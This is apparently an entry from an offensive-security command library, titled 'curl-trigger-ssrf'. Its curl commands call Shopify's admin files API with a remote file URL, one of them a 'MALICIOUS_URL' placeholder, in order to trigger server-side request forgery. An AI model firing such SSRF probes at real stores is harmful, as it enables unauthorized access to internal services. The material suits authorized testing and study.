---
id: c2e3f4g5-i6j7-8901-efgh-5678901234
data: >-
  curl -X POST
  "https://shopify-store.myshopify.com/admin/api/2023-01/files.json" -H
  "X-Shopify-Access-Token: YOUR_TOKEN" -H "Content-Type: application/json" -d
  '{"file":{"url":"https://drive.google.com/uc?id=FILE_ID&export=download","filename":"test.html"}}'
tags:
  - ssrf
  - api
type: command
output: '{"file":{"id":123,"url":"..."}}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:56.333Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-ssrf

## Command

```bash
curl -X POST "https://shopify-store.myshopify.com/admin/api/2023-01/files.json" -H "X-Shopify-Access-Token: YOUR_TOKEN" -H "Content-Type: application/json" -d '{"file":{"url":"https://drive.google.com/uc?id=FILE_ID&export=download","filename":"test.html"}}'
```

## Description

Sends a POST request to Shopify's API to upload a file via a Google Drive URL, triggering SSRF if the URL is malicious.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "X-Shopify-Access-Token: TOKEN"` | Authentication header | Yes |
| `-d '{JSON}'` | Request body with file URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://example.myshopify.com/admin/api/files.json" -H "X-Shopify-Access-Token: shpat_abc" -d '{"file":{"url":"https://drive.google.com/..."}}'
```

### Advanced Usage

```bash
curl -X POST -v "https://example.myshopify.com/admin/api/files.json" -H "X-Shopify-Access-Token: shpat_abc" -d '{"file":{"url":"MALICIOUS_URL"}}'
```

## Expected Output

JSON response with file creation details, such as {"file":{"id":123456,"status":"uploaded"}}, indicating successful processing.

## Related

- [[Related Procedure|procedures/Trigger-SSRF-via-Shopify-API]]
